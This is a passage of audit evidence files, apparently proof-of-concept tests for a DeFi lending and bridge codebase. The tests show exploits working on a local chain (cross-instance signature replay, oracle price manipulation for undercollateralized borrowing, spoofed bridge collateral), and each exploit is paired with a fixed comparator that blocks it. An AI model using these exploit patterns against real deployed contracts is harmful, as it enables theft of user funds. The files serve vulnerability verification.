run/evidence/C-006/repro.test.mjs:57:  await expectRevert(market.connect(attacker).setCollateralFactor(7_000));
run/evidence/C-006/repro.test.mjs:58:  assert.equal(await market.collateralFactorBps(), 7_500n);
run/evidence/C-006/repro.test.mjs:59:  console.log(JSON.stringify({ oracle: "C-006-negative", unauthorizedDecreaseRejected: true, factorAfter: String(await market.collateralFactorBps()) }));
run/evidence/C-006/repro.test.mjs:60:});
run/evidence/C-010/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-010/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-010/repro.test.mjs:3:import { blockDeadline, compileAll, deploy, ether, ethers, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-010/repro.test.mjs:5:const comparatorSource = `
run/evidence/C-010/repro.test.mjs:6:// SPDX-License-Identifier: MIT
run/evidence/C-010/repro.test.mjs:7:pragma solidity 0.8.30;
run/evidence/C-010/repro.test.mjs:8:import {IERC20} from "contracts/interfaces/ProtocolInterfaces.sol";
run/evidence/C-010/repro.test.mjs:9:import {SignatureCodec} from "contracts/lib/SignatureCodec.sol";
run/evidence/C-010/repro.test.mjs:10:contract DomainPermitRouterC010 {
run/evidence/C-010/repro.test.mjs:11:    using SignatureCodec for bytes32;
run/evidence/C-010/repro.test.mjs:12:    bytes32 public constant TRANSFER_TYPEHASH = keccak256("TransferPermit(address router,uint256 chainId,address owner,address token,uint256 amount,uint256 nonce,uint256 deadline)");
run/evidence/C-010/repro.test.mjs:13:    mapping(address => uint256) public nonces;
run/evidence/C-010/repro.test.mjs:14:    function executeTransfer(address owner, IERC20 token, uint256 amount, address recipient, uint256 deadline, bytes calldata signature) external {
run/evidence/C-010/repro.test.mjs:15:        require(block.timestamp <= deadline, "EXPIRED");
run/evidence/C-010/repro.test.mjs:16:        uint256 nonce = nonces[owner]++;
run/evidence/C-010/repro.test.mjs:17:        bytes32 payload = keccak256(abi.encode(TRANSFER_TYPEHASH, address(this), block.chainid, owner, address(token), amount, nonce, deadline));
run/evidence/C-010/repro.test.mjs:18:        require(payload.messageHash().recover(signature) == owner, "SIGNER");
run/evidence/C-010/repro.test.mjs:19:        require(token.transferFrom(owner, recipient, amount), "TRANSFER");
run/evidence/C-010/repro.test.mjs:20:    }
run/evidence/C-010/repro.test.mjs:21:}
run/evidence/C-010/repro.test.mjs:22:`;
run/evidence/C-010/repro.test.mjs:24:let artifacts;
run/evidence/C-010/repro.test.mjs:26:before(async () => {
run/evidence/C-010/repro.test.mjs:27:  artifacts = await compileAll({
run/evidence/C-010/repro.test.mjs:28:    additionalSources: { "run/evidence/C-010/DomainPermitRouterC010.sol": comparatorSource }
run/evidence/C-010/repro.test.mjs:29:  });
run/evidence/C-010/repro.test.mjs:30:});
run/evidence/C-010/repro.test.mjs:32:async function setup(routerContract = "PermitRouter") {
run/evidence/C-010/repro.test.mjs:33:  const chain = await makeChain();
run/evidence/C-010/repro.test.mjs:34:  const [admin, owner, recipient, relayer] = chain.signers;
run/evidence/C-010/repro.test.mjs:35:  const ownerWallet = chain.wallets[1];
run/evidence/C-010/repro.test.mjs:36:  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-010/repro.test.mjs:37:  const routerA = await deploy(artifacts, routerContract, admin);
run/evidence/C-010/repro.test.mjs:38:  const routerB = await deploy(artifacts, routerContract, admin);
run/evidence/C-010/repro.test.mjs:39:  await send(token.mint(await owner.getAddress(), ether(50)));
run/evidence/C-010/repro.test.mjs:40:  await send(token.connect(owner).approve(await routerA.getAddress(), ether(25)));
run/evidence/C-010/repro.test.mjs:41:  await send(token.connect(owner).approve(await routerB.getAddress(), ether(25)));
run/evidence/C-010/repro.test.mjs:42:  const deadline = await blockDeadline(chain.provider);
run/evidence/C-010/repro.test.mjs:43:  return { chain, owner, ownerWallet, recipient, relayer, token, routerA, routerB, deadline };
run/evidence/C-010/repro.test.mjs:44:}
run/evidence/C-010/repro.test.mjs:46:async function targetSignature(context, amount) {
run/evidence/C-010/repro.test.mjs:47:  const payload = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
run/evidence/C-010/repro.test.mjs:48:    ["bytes32", "address", "address", "uint256", "uint256", "uint256"],
run/evidence/C-010/repro.test.mjs:49:    [await context.routerA.TRANSFER_TYPEHASH(), await context.owner.getAddress(), await context.token.getAddress(), amount, 0, context.deadline]
run/evidence/C-010/repro.test.mjs:50:  ));
run/evidence/C-010/repro.test.mjs:51:  return context.ownerWallet.signMessage(ethers.getBytes(payload));
run/evidence/C-010/repro.test.mjs:52:}
run/evidence/C-010/repro.test.mjs:54:async function comparatorSignature(context, amount) {
run/evidence/C-010/repro.test.mjs:55:  const network = await context.chain.provider.getNetwork();
run/evidence/C-010/repro.test.mjs:56:  const payload = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
run/evidence/C-010/repro.test.mjs:57:    ["bytes32", "address", "uint256", "address", "address", "uint256", "uint256", "uint256"],
run/evidence/C-010/repro.test.mjs:58:    [await context.routerA.TRANSFER_TYPEHASH(), await context.routerA.getAddress(), network.chainId, await context.owner.getAddress(), await context.token.getAddress(), amount, 0, context.deadline]
run/evidence/C-010/repro.test.mjs:59:  ));
run/evidence/C-010/repro.test.mjs:60:  return context.ownerWallet.signMessage(ethers.getBytes(payload));
run/evidence/C-010/repro.test.mjs:61:}
run/evidence/C-010/repro.test.mjs:63:async function execute(context, router, amount, signature) {
run/evidence/C-010/repro.test.mjs:64:  return send(router.connect(context.relayer).executeTransfer(
run/evidence/C-010/repro.test.mjs:65:    await context.owner.getAddress(), await context.token.getAddress(), amount,
run/evidence/C-010/repro.test.mjs:66:    await context.recipient.getAddress(), context.deadline, signature
run/evidence/C-010/repro.test.mjs:67:  ));
run/evidence/C-010/repro.test.mjs:68:}
run/evidence/C-010/repro.test.mjs:70:test("positive: one signature replays across two router instances with independent nonce stores", async () => {
run/evidence/C-010/repro.test.mjs:71:  const context = await setup();
run/evidence/C-010/repro.test.mjs:72:  const amount = ether(25);
run/evidence/C-010/repro.test.mjs:73:  const signature = await targetSignature(context, amount);
run/evidence/C-010/repro.test.mjs:74:  await execute(context, context.routerA, amount, signature);
run/evidence/C-010/repro.test.mjs:75:  await execute(context, context.routerB, amount, signature);
run/evidence/C-010/repro.test.mjs:77:  const received = await context.token.balanceOf(await context.recipient.getAddress());
run/evidence/C-010/repro.test.mjs:78:  assert.equal(received, amount * 2n);
run/evidence/C-010/repro.test.mjs:79:  assert.equal(await context.routerA.nonces(await context.owner.getAddress()), 1n);
run/evidence/C-010/repro.test.mjs:80:  assert.equal(await context.routerB.nonces(await context.owner.getAddress()), 1n);
run/evidence/C-010/repro.test.mjs:81:  console.log(JSON.stringify({ oracle: "C-010-positive", authorizedAmount: String(amount), received: String(received), routerA: await context.routerA.getAddress(), routerB: await context.routerB.getAddress(), nonceA: "1", nonceB: "1" }));
run/evidence/C-010/repro.test.mjs:82:});
run/evidence/C-010/repro.test.mjs:84:test("negative comparator: binding router and chain rejects replay on a second instance", async () => {
run/evidence/C-010/repro.test.mjs:85:  const context = await setup("DomainPermitRouterC010");
run/evidence/C-010/repro.test.mjs:86:  const amount = ether(25);
run/evidence/C-010/repro.test.mjs:87:  const signature = await comparatorSignature(context, amount);
run/evidence/C-010/repro.test.mjs:88:  await execute(context, context.routerA, amount, signature);
run/evidence/C-010/repro.test.mjs:89:  await expectRevert(execute(context, context.routerB, amount, signature));
run/evidence/C-010/repro.test.mjs:91:  const received = await context.token.balanceOf(await context.recipient.getAddress());
run/evidence/C-010/repro.test.mjs:92:  assert.equal(received, amount);
run/evidence/C-010/repro.test.mjs:93:  assert.equal(await context.routerB.nonces(await context.owner.getAddress()), 0n);
run/evidence/C-010/repro.test.mjs:94:  console.log(JSON.stringify({ oracle: "C-010-negative", domainBoundReplayRejected: true, authorizedAmount: String(amount), received: String(received), nonceB: "0" }));
run/evidence/C-010/repro.test.mjs:95:});
run/evidence/C-008/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-008/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-008/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-008/repro.test.mjs:5:let artifacts;
run/evidence/C-008/repro.test.mjs:7:before(async () => {
run/evidence/C-008/repro.test.mjs:8:  artifacts = await compileAll();
run/evidence/C-008/repro.test.mjs:9:});
run/evidence/C-008/repro.test.mjs:11:async function setup(feedAnswer) {
run/evidence/C-008/repro.test.mjs:12:  const chain = await makeChain();
run/evidence/C-008/repro.test.mjs:13:  const [admin, liquidityProvider, attacker] = chain.signers;
run/evidence/C-008/repro.test.mjs:14:  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
run/evidence/C-008/repro.test.mjs:15:  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-008/repro.test.mjs:16:  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
run/evidence/C-008/repro.test.mjs:17:  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
run/evidence/C-008/repro.test.mjs:18:  const feed = await deploy(artifacts, "MockFeed", admin, [8, feedAnswer]);
run/evidence/C-008/repro.test.mjs:19:  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
run/evidence/C-008/repro.test.mjs:20:  const market = await deploy(artifacts, "LendingMarket", admin, [
run/evidence/C-008/repro.test.mjs:21:    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
run/evidence/C-008/repro.test.mjs:22:  ]);
run/evidence/C-008/repro.test.mjs:23:  const attackerAddress = await attacker.getAddress();
run/evidence/C-008/repro.test.mjs:25:  await send(asset.mint(await liquidityProvider.getAddress(), ether(10_000)));
run/evidence/C-008/repro.test.mjs:26:  await send(stable.mint(await liquidityProvider.getAddress(), ether(10_000)));
run/evidence/C-008/repro.test.mjs:27:  await send(asset.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
run/evidence/C-008/repro.test.mjs:28:  await send(stable.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
run/evidence/C-008/repro.test.mjs:29:  await send(pool.connect(liquidityProvider).addLiquidity(ether(10_000), ether(10_000)));
run/evidence/C-008/repro.test.mjs:30:  await send(stable.mint(await market.getAddress(), ether(100_000)));
run/evidence/C-008/repro.test.mjs:31:  await send(stable.mint(attackerAddress, ether(10_000)));
run/evidence/C-008/repro.test.mjs:32:  return { attacker, attackerAddress, asset, stable, vault, pool, oracle, market };
run/evidence/C-008/repro.test.mjs:33:}
run/evidence/C-008/repro.test.mjs:35:async function manipulateAndDeposit(context) {
run/evidence/C-008/repro.test.mjs:36:  await send(context.stable.connect(context.attacker).approve(await context.pool.getAddress(), ether(10_000)));
run/evidence/C-008/repro.test.mjs:37:  await send(context.pool.connect(context.attacker).swapExactInput(
run/evidence/C-008/repro.test.mjs:38:    await context.stable.getAddress(), ether(10_000), 0, context.attackerAddress
run/evidence/C-008/repro.test.mjs:39:  ));
run/evidence/C-008/repro.test.mjs:40:  const acquiredAsset = await context.asset.balanceOf(context.attackerAddress);
run/evidence/C-008/repro.test.mjs:41:  await send(context.asset.connect(context.attacker).approve(await context.vault.getAddress(), acquiredAsset));
run/evidence/C-008/repro.test.mjs:42:  await send(context.vault.connect(context.attacker).deposit(acquiredAsset, context.attackerAddress));
run/evidence/C-008/repro.test.mjs:43:  const shares = await context.vault.balanceOf(context.attackerAddress);
run/evidence/C-008/repro.test.mjs:44:  await send(context.vault.connect(context.attacker).approve(await context.market.getAddress(), shares));
run/evidence/C-008/repro.test.mjs:45:  await send(context.market.connect(context.attacker).depositCollateral(shares, context.attackerAddress));
run/evidence/C-008/repro.test.mjs:46:  return { acquiredAsset, shares };
run/evidence/C-008/repro.test.mjs:47:}
run/evidence/C-008/repro.test.mjs:49:test("positive: fallback to manipulable pool spot creates profitable undercollateralized borrowing", async () => {
run/evidence/C-008/repro.test.mjs:50:  const context = await setup(0);
run/evidence/C-008/repro.test.mjs:51:  const { acquiredAsset } = await manipulateAndDeposit(context);
run/evidence/C-008/repro.test.mjs:52:  const manipulatedPrice = await context.oracle.price();
run/evidence/C-008/repro.test.mjs:53:  const manipulatedLimit = await context.market.borrowLimit(context.attackerAddress);
run/evidence/C-008/repro.test.mjs:54:  const safeLimitAtOneDollar = acquiredAsset * 7_500n / 10_000n;
run/evidence/C-008/repro.test.mjs:56:  assert(manipulatedPrice > ether(3));
run/evidence/C-008/repro.test.mjs:57:  assert(manipulatedLimit > safeLimitAtOneDollar * 3n);
run/evidence/C-008/repro.test.mjs:58:  await send(context.market.connect(context.attacker).borrow(
run/evidence/C-008/repro.test.mjs:59:    manipulatedLimit, context.attackerAddress, "0x"
run/evidence/C-008/repro.test.mjs:60:  ));
run/evidence/C-008/repro.test.mjs:61:  const attackerStableAfter = await context.stable.balanceOf(context.attackerAddress);
run/evidence/C-008/repro.test.mjs:62:  assert.equal(await context.market.debt(context.attackerAddress), manipulatedLimit);
run/evidence/C-008/repro.test.mjs:63:  assert(manipulatedLimit > safeLimitAtOneDollar);
run/evidence/C-008/repro.test.mjs:64:  assert(attackerStableAfter > ether(10_000));
run/evidence/C-008/repro.test.mjs:65:  console.log(JSON.stringify({ oracle: "C-008-positive", startingStable: String(ether(10_000)), acquiredAsset: String(acquiredAsset), manipulatedPrice: String(manipulatedPrice), safeLimitAtOneDollar: String(safeLimitAtOneDollar), debtAfter: String(await context.market.debt(context.attackerAddress)), finalLiquidStable: String(attackerStableAfter) }));
run/evidence/C-008/repro.test.mjs:66:});
run/evidence/C-008/repro.test.mjs:68:test("negative: a positive primary feed ignores the same pool manipulation and blocks excess borrowing", async () => {
run/evidence/C-008/repro.test.mjs:69:  const context = await setup(100_000_000);
run/evidence/C-008/repro.test.mjs:70:  const { acquiredAsset } = await manipulateAndDeposit(context);
run/evidence/C-008/repro.test.mjs:71:  const primaryPrice = await context.oracle.price();
run/evidence/C-008/repro.test.mjs:72:  const safeLimit = await context.market.borrowLimit(context.attackerAddress);
run/evidence/C-008/repro.test.mjs:73:  assert.equal(primaryPrice, ether(1));
run/evidence/C-008/repro.test.mjs:74:  assert.equal(safeLimit, acquiredAsset * 7_500n / 10_000n);
run/evidence/C-008/repro.test.mjs:76:  await expectRevert(context.market.connect(context.attacker).borrow(
run/evidence/C-008/repro.test.mjs:77:    ether(10_000), context.attackerAddress, "0x"
run/evidence/C-008/repro.test.mjs:78:  ));
run/evidence/C-008/repro.test.mjs:79:  assert.equal(await context.market.debt(context.attackerAddress), 0n);
run/evidence/C-008/repro.test.mjs:80:  console.log(JSON.stringify({ oracle: "C-008-negative", primaryPrice: String(primaryPrice), safeLimit: String(safeLimit), excessBorrowRejected: true, debtAfter: "0" }));
run/evidence/C-008/repro.test.mjs:81:});
run/evidence/C-002/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-002/reproduce.sh:2:set -euo pipefail
run/evidence/C-002/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-002/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-002/repro.test.mjs
run/evidence/C-006/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-006/reproduce.sh:2:set -euo pipefail
run/evidence/C-006/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-006/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-006/repro.test.mjs
run/evidence/C-010/reproduce.sh:1:#!/usr/bin/env bash
run/evidence/C-010/reproduce.sh:2:set -euo pipefail
run/evidence/C-010/reproduce.sh:3:cd "$(dirname "$0")/../../.."
run/evidence/C-010/reproduce.sh:4:node --test --test-concurrency=1 run/evidence/C-010/repro.test.mjs
run/evidence/C-002/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-002/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-002/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-002/repro.test.mjs:5:const comparatorSource = `
run/evidence/C-002/repro.test.mjs:6:// SPDX-License-Identifier: MIT
run/evidence/C-002/repro.test.mjs:7:pragma solidity 0.8.30;
run/evidence/C-002/repro.test.mjs:9:interface IMessageContextC002 {
run/evidence/C-002/repro.test.mjs:10:    function xDomainMessageSender() external view returns (address);
run/evidence/C-002/repro.test.mjs:11:    function xDomainSourceChain() external view returns (uint32);
run/evidence/C-002/repro.test.mjs:12:}
run/evidence/C-002/repro.test.mjs:13:interface IBridgeReceiverC002 {
run/evidence/C-002/repro.test.mjs:14:    function onBridgeCredit(address beneficiary, uint256 shares) external;
run/evidence/C-002/repro.test.mjs:15:}
run/evidence/C-002/repro.test.mjs:16:contract BridgeGatewayFixedC002 {
run/evidence/C-002/repro.test.mjs:17:    IMessageContextC002 public immutable messenger;
run/evidence/C-002/repro.test.mjs:18:    IBridgeReceiverC002 public immutable receiver;
run/evidence/C-002/repro.test.mjs:19:    address public admin;
run/evidence/C-002/repro.test.mjs:20:    mapping(uint32 => address) public remoteGateway;
run/evidence/C-002/repro.test.mjs:21:    mapping(uint32 => mapping(uint64 => bool)) public processedNonce;
run/evidence/C-002/repro.test.mjs:23:    constructor(IMessageContextC002 messenger_, IBridgeReceiverC002 receiver_, address admin_) {
run/evidence/C-002/repro.test.mjs:24:        messenger = messenger_; receiver = receiver_; admin = admin_;
run/evidence/C-002/repro.test.mjs:25:    }
run/evidence/C-002/repro.test.mjs:26:    function configureRemote(uint32 sourceChain, address gateway) external {
run/evidence/C-002/repro.test.mjs:27:        require(msg.sender == admin, "ADMIN");
run/evidence/C-002/repro.test.mjs:28:        remoteGateway[sourceChain] = gateway;
run/evidence/C-002/repro.test.mjs:29:    }
run/evidence/C-002/repro.test.mjs:30:    function finalizeCollateral(uint32 sourceChain, uint64 nonce, address beneficiary, uint256 shares) external {
run/evidence/C-002/repro.test.mjs:31:        require(msg.sender == address(messenger), "MESSENGER");
run/evidence/C-002/repro.test.mjs:32:        require(messenger.xDomainSourceChain() == sourceChain, "SOURCE_CHAIN");
run/evidence/C-002/repro.test.mjs:33:        address sourceSender = messenger.xDomainMessageSender();
run/evidence/C-002/repro.test.mjs:34:        require(remoteGateway[sourceChain] == sourceSender, "REMOTE_GATEWAY");
run/evidence/C-002/repro.test.mjs:35:        require(!processedNonce[sourceChain][nonce], "PROCESSED");
run/evidence/C-002/repro.test.mjs:36:        processedNonce[sourceChain][nonce] = true;
run/evidence/C-002/repro.test.mjs:37:        receiver.onBridgeCredit(beneficiary, shares);
run/evidence/C-002/repro.test.mjs:38:    }
run/evidence/C-002/repro.test.mjs:39:}
run/evidence/C-002/repro.test.mjs:40:`;
run/evidence/C-002/repro.test.mjs:42:let artifacts;
run/evidence/C-002/repro.test.mjs:44:before(async () => {
run/evidence/C-002/repro.test.mjs:45:  artifacts = await compileAll({
run/evidence/C-002/repro.test.mjs:46:    additionalSources: { "run/evidence/C-002/BridgeGatewayFixedC002.sol": comparatorSource }
run/evidence/C-002/repro.test.mjs:47:  });
run/evidence/C-002/repro.test.mjs:48:});
run/evidence/C-002/repro.test.mjs:50:async function setup(gatewayContract = "BridgeGateway") {
run/evidence/C-002/repro.test.mjs:51:  const chain = await makeChain();
run/evidence/C-002/repro.test.mjs:52:  const [admin, attacker, configuredRemote, untrustedRemote] = chain.signers;
run/evidence/C-002/repro.test.mjs:53:  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
run/evidence/C-002/repro.test.mjs:54:  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-002/repro.test.mjs:55:  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
run/evidence/C-002/repro.test.mjs:56:  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
run/evidence/C-002/repro.test.mjs:57:  const feed = await deploy(artifacts, "MockFeed", admin, [8, 100_000_000]);
run/evidence/C-002/repro.test.mjs:58:  const oracle = await deploy(artifacts, "ReserveOracle", admin, [await feed.getAddress(), await pool.getAddress()]);
run/evidence/C-002/repro.test.mjs:59:  const market = await deploy(artifacts, "LendingMarket", admin, [
run/evidence/C-002/repro.test.mjs:60:    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
run/evidence/C-002/repro.test.mjs:61:  ]);
run/evidence/C-002/repro.test.mjs:62:  const messenger = await deploy(artifacts, "MockMessenger", admin);
run/evidence/C-002/repro.test.mjs:63:  const gateway = await deploy(artifacts, gatewayContract, admin, [
run/evidence/C-002/repro.test.mjs:64:    await messenger.getAddress(), await market.getAddress(), await admin.getAddress()
run/evidence/C-002/repro.test.mjs:65:  ]);
run/evidence/C-002/repro.test.mjs:66:  await send(gateway.configureRemote(10, await configuredRemote.getAddress()));
run/evidence/C-002/repro.test.mjs:67:  await send(market.setBridge(await gateway.getAddress()));
run/evidence/C-002/repro.test.mjs:68:  await send(stable.mint(await market.getAddress(), ether(10_000)));
run/evidence/C-002/repro.test.mjs:69:  return { attacker, configuredRemote, untrustedRemote, stable, market, messenger, gateway };
run/evidence/C-002/repro.test.mjs:70:}
run/evidence/C-002/repro.test.mjs:72:function finalizeMessage(gateway, beneficiary, shares) {
run/evidence/C-002/repro.test.mjs:73:  return gateway.interface.encodeFunctionData("finalizeCollateral", [10, 41, beneficiary, shares]);
run/evidence/C-002/repro.test.mjs:74:}
run/evidence/C-002/repro.test.mjs:76:test("positive: authentic messenger relay from an unconfigured remote application creates spendable collateral", async () => {
run/evidence/C-002/repro.test.mjs:77:  const { attacker, untrustedRemote, stable, market, messenger, gateway } = await setup();
run/evidence/C-002/repro.test.mjs:78:  const beneficiary = await attacker.getAddress();
run/evidence/C-002/repro.test.mjs:79:  const configured = await gateway.remoteGateway(10);
run/evidence/C-002/repro.test.mjs:80:  const actualRemote = await untrustedRemote.getAddress();
run/evidence/C-002/repro.test.mjs:81:  assert.notEqual(actualRemote, configured);
run/evidence/C-002/repro.test.mjs:83:  await send(messenger.relay(
run/evidence/C-002/repro.test.mjs:84:    await gateway.getAddress(), 10, actualRemote, finalizeMessage(gateway, beneficiary, ether(1_000))
run/evidence/C-002/repro.test.mjs:85:  ));
run/evidence/C-002/repro.test.mjs:86:  assert.equal(await market.bridgeCollateral(beneficiary), ether(1_000));
run/evidence/C-002/repro.test.mjs:87:  await send(market.connect(attacker).borrow(ether(750), beneficiary, "0x"));
run/evidence/C-002/repro.test.mjs:88:  assert.equal(await stable.balanceOf(beneficiary), ether(750));
run/evidence/C-002/repro.test.mjs:89:  console.log(JSON.stringify({ oracle: "C-002-positive", configuredRemote: configured, actualRemote, bridgeCollateral: String(await market.bridgeCollateral(beneficiary)), attackerStable: String(await stable.balanceOf(beneficiary)) }));
run/evidence/C-002/repro.test.mjs:90:});
run/evidence/C-002/repro.test.mjs:92:test("negative comparator: binding messenger source sender to configured gateway rejects the same message", async () => {
run/evidence/C-002/repro.test.mjs:93:  const { attacker, configuredRemote, untrustedRemote, market, messenger, gateway } = await setup("BridgeGatewayFixedC002");
run/evidence/C-002/repro.test.mjs:94:  const beneficiary = await attacker.getAddress();
run/evidence/C-002/repro.test.mjs:95:  const actualRemote = await untrustedRemote.getAddress();
run/evidence/C-002/repro.test.mjs:96:  const message = finalizeMessage(gateway, beneficiary, ether(1_000));
run/evidence/C-002/repro.test.mjs:98:  await expectRevert(
run/evidence/C-002/repro.test.mjs:99:    messenger.relay(await gateway.getAddress(), 10, actualRemote, message)
run/evidence/C-002/repro.test.mjs:100:  );
run/evidence/C-002/repro.test.mjs:101:  assert.equal(await market.bridgeCollateral(beneficiary), 0n);
run/evidence/C-002/repro.test.mjs:103:  await send(messenger.relay(
run/evidence/C-002/repro.test.mjs:104:    await gateway.getAddress(), 10, await configuredRemote.getAddress(), message
run/evidence/C-002/repro.test.mjs:105:  ));
run/evidence/C-002/repro.test.mjs:106:  assert.equal(await market.bridgeCollateral(beneficiary), ether(1_000));
run/evidence/C-002/repro.test.mjs:107:  console.log(JSON.stringify({ oracle: "C-002-negative", wrongSenderRejected: true, correctSenderCredited: String(await market.bridgeCollateral(beneficiary)) }));
run/evidence/C-002/repro.test.mjs:108:});
run/evidence/C-009/repro.test.mjs:1:import assert from "node:assert/strict";
run/evidence/C-009/repro.test.mjs:2:import { before, test } from "node:test";
run/evidence/C-009/repro.test.mjs:3:import { compileAll, deploy, ether, expectRevert, makeChain, send } from "../../../test/support.mjs";
run/evidence/C-009/repro.test.mjs:5:const comparatorSource = `
run/evidence/C-009/repro.test.mjs:6:// SPDX-License-Identifier: MIT
run/evidence/C-009/repro.test.mjs:7:pragma solidity 0.8.30;
run/evidence/C-009/repro.test.mjs:9:interface IFeedC009 {
run/evidence/C-009/repro.test.mjs:10:    function decimals() external view returns (uint8);
run/evidence/C-009/repro.test.mjs:11:    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
run/evidence/C-009/repro.test.mjs:12:}
run/evidence/C-009/repro.test.mjs:13:interface IPoolC009 { function spotPrice() external view returns (uint256); }
run/evidence/C-009/repro.test.mjs:14:contract FreshnessOracleC009 {
run/evidence/C-009/repro.test.mjs:15:    IFeedC009 public immutable feed;
run/evidence/C-009/repro.test.mjs:16:    IPoolC009 public immutable pool;
run/evidence/C-009/repro.test.mjs:17:    uint256 public constant MAX_AGE = 1 days;
run/evidence/C-009/repro.test.mjs:18:    constructor(IFeedC009 feed_, IPoolC009 pool_) { feed = feed_; pool = pool_; }
run/evidence/C-009/repro.test.mjs:19:    function price() external view returns (uint256) {
run/evidence/C-009/repro.test.mjs:20:        (, int256 answer,, uint256 updatedAt,) = feed.latestRoundData();
run/evidence/C-009/repro.test.mjs:21:        if (answer > 0 && updatedAt != 0 && block.timestamp - updatedAt <= MAX_AGE) {
run/evidence/C-009/repro.test.mjs:22:            uint256 value = uint256(answer);
run/evidence/C-009/repro.test.mjs:23:            uint8 d = feed.decimals();
run/evidence/C-009/repro.test.mjs:24:            if (d < 18) return value * 10 ** (18 - d);
run/evidence/C-009/repro.test.mjs:25:            if (d > 18) return value / 10 ** (d - 18);
run/evidence/C-009/repro.test.mjs:26:            return value;
run/evidence/C-009/repro.test.mjs:27:        }
run/evidence/C-009/repro.test.mjs:28:        return pool.spotPrice();
run/evidence/C-009/repro.test.mjs:29:    }
run/evidence/C-009/repro.test.mjs:30:}
run/evidence/C-009/repro.test.mjs:31:`;
run/evidence/C-009/repro.test.mjs:33:let artifacts;
run/evidence/C-009/repro.test.mjs:35:before(async () => {
run/evidence/C-009/repro.test.mjs:36:  artifacts = await compileAll({
run/evidence/C-009/repro.test.mjs:37:    additionalSources: { "run/evidence/C-009/FreshnessOracleC009.sol": comparatorSource }
run/evidence/C-009/repro.test.mjs:38:  });
run/evidence/C-009/repro.test.mjs:39:});
run/evidence/C-009/repro.test.mjs:41:async function setup(oracleContract = "ReserveOracle") {
run/evidence/C-009/repro.test.mjs:42:  const chain = await makeChain();
run/evidence/C-009/repro.test.mjs:43:  const [admin, liquidityProvider, attacker] = chain.signers;
run/evidence/C-009/repro.test.mjs:44:  const asset = await deploy(artifacts, "MockERC20", admin, ["Aster Asset", "AST", 18]);
run/evidence/C-009/repro.test.mjs:45:  const stable = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
run/evidence/C-009/repro.test.mjs:46:  const vault = await deploy(artifacts, "AsterVault", admin, [await asset.getAddress()]);
run/evidence/C-009/repro.test.mjs:47:  const pool = await deploy(artifacts, "ReservePool", admin, [await asset.getAddress(), await stable.getAddress()]);
run/evidence/C-009/repro.test.mjs:48:  const feed = await deploy(artifacts, "MockFeed", admin, [8, 200_000_000]);
run/evidence/C-009/repro.test.mjs:49:  const oracle = await deploy(artifacts, oracleContract, admin, [await feed.getAddress(), await pool.getAddress()]);
run/evidence/C-009/repro.test.mjs:50:  const market = await deploy(artifacts, "LendingMarket", admin, [
run/evidence/C-009/repro.test.mjs:51:    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(), await admin.getAddress()
run/evidence/C-009/repro.test.mjs:52:  ]);
run/evidence/C-009/repro.test.mjs:53:  const attackerAddress = await attacker.getAddress();
run/evidence/C-009/repro.test.mjs:55:  await send(asset.mint(await liquidityProvider.getAddress(), ether(10_000)));
run/evidence/C-009/repro.test.mjs:56:  await send(stable.mint(await liquidityProvider.getAddress(), ether(10_000)));
run/evidence/C-009/repro.test.mjs:57:  await send(asset.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
run/evidence/C-009/repro.test.mjs:58:  await send(stable.connect(liquidityProvider).approve(await pool.getAddress(), ether(10_000)));
run/evidence/C-009/repro.test.mjs:59:  await send(pool.connect(liquidityProvider).addLiquidity(ether(10_000), ether(10_000)));
run/evidence/C-009/repro.test.mjs:60:  await send(stable.mint(await market.getAddress(), ether(10_000)));
run/evidence/C-009/repro.test.mjs:61:  await send(asset.mint(attackerAddress, ether(1_000)));
run/evidence/C-009/repro.test.mjs:62:  await send(asset.connect(attacker).approve(await vault.getAddress(), ether(1_000)));
run/evidence/C-009/repro.test.mjs:63:  await send(vault.connect(attacker).deposit(ether(1_000), attackerAddress));
run/evidence/C-009/repro.test.mjs:64:  await send(vault.connect(attacker).approve(await market.getAddress(), ether(1_000)));
run/evidence/C-009/repro.test.mjs:65:  await send(market.connect(attacker).depositCollateral(ether(1_000), attackerAddress));
run/evidence/C-009/repro.test.mjs:67:  const [, , , updatedAt] = await feed.latestRoundData();
